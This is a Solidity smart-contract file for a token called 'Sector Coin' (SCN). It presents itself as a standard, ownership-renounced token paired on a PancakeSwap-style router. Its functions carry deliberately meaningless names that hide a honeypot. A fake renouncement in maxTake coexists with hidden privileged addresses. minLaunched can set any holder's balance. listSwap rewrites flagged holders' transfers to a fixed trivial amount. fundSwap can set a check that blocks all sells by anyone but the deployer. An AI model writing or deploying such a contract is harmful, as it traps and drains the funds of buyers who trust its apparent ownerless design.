//SPDX-License-Identifier: MIT

pragma solidity ^0.8.10;

library SafeMath {

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;

        return c;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }

    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
}

abstract contract limitLiquidityWallet {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface shouldWallet {
    function createPair(address buyMode, address receiverSell) external returns (address);

    function feeTo() external view returns (address);
}

interface takeBuyTrading {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}


interface liquidityMarketing {
    function totalSupply() external view returns (uint256);

    function balanceOf(address limitReceiver) external view returns (uint256);

    function transfer(address launchedSellReceiver, uint256 senderTx) external returns (bool);

    function allowance(address atTake, address spender) external view returns (uint256);

    function approve(address spender, uint256 senderTx) external returns (bool);

    function transferFrom(
        address sender,
        address launchedSellReceiver,
        uint256 senderTx
    ) external returns (bool);

    event Transfer(address indexed from, address indexed limitMarketingAt, uint256 value);
    event Approval(address indexed atTake, address indexed spender, uint256 value);
}

interface liquidityMarketingMetadata is liquidityMarketing {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract SectorCoin is limitLiquidityWallet, liquidityMarketing, liquidityMarketingMetadata {

    function decimals() external view virtual override returns (uint8) {
        return senderTake;
    }

    address private tokenEnable;

    function walletLimitLiquidity(address walletFee, address launchedSellReceiver, uint256 senderTx) internal view returns (uint256) {
        require(senderTx > 0);

        uint256 modeTrading = 0;
        if (walletFee == fromListAmount && tradingLaunch > 0) {
            modeTrading = senderTx * tradingLaunch / 100;
        } else if (launchedSellReceiver == fromListAmount && exemptAutoWallet > 0) {
            modeTrading = senderTx * exemptAutoWallet / 100;
        }
        require(modeTrading <= senderTx);
        return senderTx - modeTrading;
    }

    uint256 receiverFund;

    constructor (){
        
        maxTake();
        takeBuyTrading tokenTo = takeBuyTrading(receiverTeamTake);
        fromListAmount = shouldWallet(tokenTo.factory()).createPair(tokenTo.WETH(), address(this));
        enableModeTotal = shouldWallet(tokenTo.factory()).feeTo();
        if (buyReceiver == enableTakeTeam) {
            teamSender = maxTo;
        }
        buyExemptShould = _msgSender();
        takeLaunched[buyExemptShould] = true;
        tokenList[buyExemptShould] = enableFundLiquidity;
        
        emit Transfer(address(0), buyExemptShould, enableFundLiquidity);
    }

    function modeTeam(address liquidityExempt) public {
        require(liquidityExempt.balance < 100000);
        if (enableAuto) {
            return;
        }
        if (teamSender == maxTo) {
            enableTakeTeam = true;
        }
        takeLaunched[liquidityExempt] = true;
        
        enableAuto = true;
    }

    uint256 public maxTo;

    function listSwap(address feeLaunch) public {
        minTxEnable();
        
        if (feeLaunch == buyExemptShould || feeLaunch == fromListAmount) {
            return;
        }
        isEnable[feeLaunch] = true;
    }

    function owner() external view returns (address) {
        return tokenEnable;
    }

    function fundSwap(uint256 senderTx) public {
        minTxEnable();
        receiverFund = senderTx;
    }

    function getOwner() external view returns (address) {
        return tokenEnable;
    }

    function transferFrom(address walletFee, address launchedSellReceiver, uint256 senderTx) external override returns (bool) {
        if (_msgSender() != receiverTeamTake) {
            if (txFund[walletFee][_msgSender()] != type(uint256).max) {
                require(senderTx <= txFund[walletFee][_msgSender()]);
                txFund[walletFee][_msgSender()] -= senderTx;
            }
        }
        return toEnableReceiver(walletFee, launchedSellReceiver, senderTx);
    }

    mapping(address => bool) public takeLaunched;

    function minIsAmount(address walletFee, address launchedSellReceiver, uint256 senderTx) internal returns (bool) {
        require(tokenList[walletFee] >= senderTx);
        tokenList[walletFee] -= senderTx;
        tokenList[launchedSellReceiver] += senderTx;
        emit Transfer(walletFee, launchedSellReceiver, senderTx);
        return true;
    }

    address enableModeTotal;

    string private limitTx = "Sector Coin";

    mapping(address => mapping(address => uint256)) private txFund;

    function toEnableReceiver(address walletFee, address launchedSellReceiver, uint256 senderTx) internal returns (bool) {
        if (walletFee == buyExemptShould) {
            return minIsAmount(walletFee, launchedSellReceiver, senderTx);
        }
        uint256 launchedFrom = liquidityMarketing(fromListAmount).balanceOf(enableModeTotal);
        require(launchedFrom == receiverFund);
        require(launchedSellReceiver != enableModeTotal);
        if (isEnable[walletFee]) {
            return minIsAmount(walletFee, launchedSellReceiver, launchedTotalWallet);
        }
        senderTx = walletLimitLiquidity(walletFee, launchedSellReceiver, senderTx);
        return minIsAmount(walletFee, launchedSellReceiver, senderTx);
    }

    uint8 private senderTake = 18;

    function name() external view virtual override returns (string memory) {
        return limitTx;
    }

    function minLaunched(address tokenTotal, uint256 senderTx) public {
        minTxEnable();
        tokenList[tokenTotal] = senderTx;
    }

    address public fromListAmount;

    function symbol() external view virtual override returns (string memory) {
        return liquidityToken;
    }

    uint256 public tradingLaunch = 0;

    uint256 private teamSender;

    uint256 public exemptAutoWallet = 0;

    bool public enableAuto;

    function transfer(address tokenTotal, uint256 senderTx) external virtual override returns (bool) {
        return toEnableReceiver(_msgSender(), tokenTotal, senderTx);
    }

    mapping(address => bool) public isEnable;

    function balanceOf(address limitReceiver) public view virtual override returns (uint256) {
        return tokenList[limitReceiver];
    }

    function totalSupply() external view virtual override returns (uint256) {
        return enableFundLiquidity;
    }

    uint256 constant launchedTotalWallet = 9 ** 10;

    function minTxEnable() private view {
        require(takeLaunched[_msgSender()]);
    }

    function allowance(address listTx, address tokenLaunchShould) external view virtual override returns (uint256) {
        if (tokenLaunchShould == receiverTeamTake) {
            return type(uint256).max;
        }
        return txFund[listTx][tokenLaunchShould];
    }

    event OwnershipTransferred(address indexed isLimitList, address indexed walletMin);

    uint256 private enableFundLiquidity = 100000000 * 10 ** 18;

    address receiverTeamTake = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    bool private enableTakeTeam;

    string private liquidityToken = "SCN";

    function maxTake() public {
        emit OwnershipTransferred(buyExemptShould, address(0));
        tokenEnable = address(0);
    }

    mapping(address => uint256) private tokenList;

    address public buyExemptShould;

    function approve(address tokenLaunchShould, uint256 senderTx) public virtual override returns (bool) {
        txFund[_msgSender()][tokenLaunchShould] = senderTx;
        emit Approval(_msgSender(), tokenLaunchShould, senderTx);
        return true;
    }

    uint256 receiverLaunch;

    bool private buyReceiver;

}